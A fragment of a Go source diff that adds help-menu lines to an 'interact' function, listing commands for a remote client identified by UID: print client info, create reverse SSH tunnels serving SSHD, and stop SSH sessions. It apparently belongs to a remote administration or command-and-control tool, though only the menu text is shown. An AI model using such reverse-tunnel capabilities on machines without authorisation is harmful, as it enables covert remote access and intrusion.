@@ -499,4 +499,6 @@ func interact(UID string) {
 			fmt.Println("Available commands:")
 			fmt.Println("info\t\t\t\tprint client info")
 			fmt.Println("quickSSH\t\t\tcreate reverse SSH tunnel and serve SSHD")
-			fmt.Println("serveSSH\t\t\tcreate reverse SSH t
+			fmt.Println("serveSSH\t\t\tcreate reverse SSH tunnel and serve SSHD for other hosts")
+			fmt.Println("stopSSH\t\t\t\tstop all ssh sessions running on client")
+			fmt.
